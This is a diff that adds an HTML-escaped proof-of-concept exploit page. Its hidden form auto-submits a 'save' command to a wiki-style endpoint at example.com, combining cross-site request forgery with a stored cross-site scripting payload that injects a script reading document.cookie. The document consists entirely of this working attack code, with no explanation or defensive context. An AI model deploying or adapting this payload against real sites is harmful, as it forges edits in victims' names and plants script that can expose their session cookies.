@@ -1,0 +1,7 @@
+&lt;form method=&quot;POST&quot; action=&quot;http://example.com/index.php/Home&quot; name=&quot;myfrm&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;cmd&quot; value=&#039;save&#039;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;gpcontent&quot; value=&#039;text&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&#039;&gt;
+&lt;/form&gt;
+&lt;script&gt;
+document.myfrm.submit();
+&lt;/script&gt;
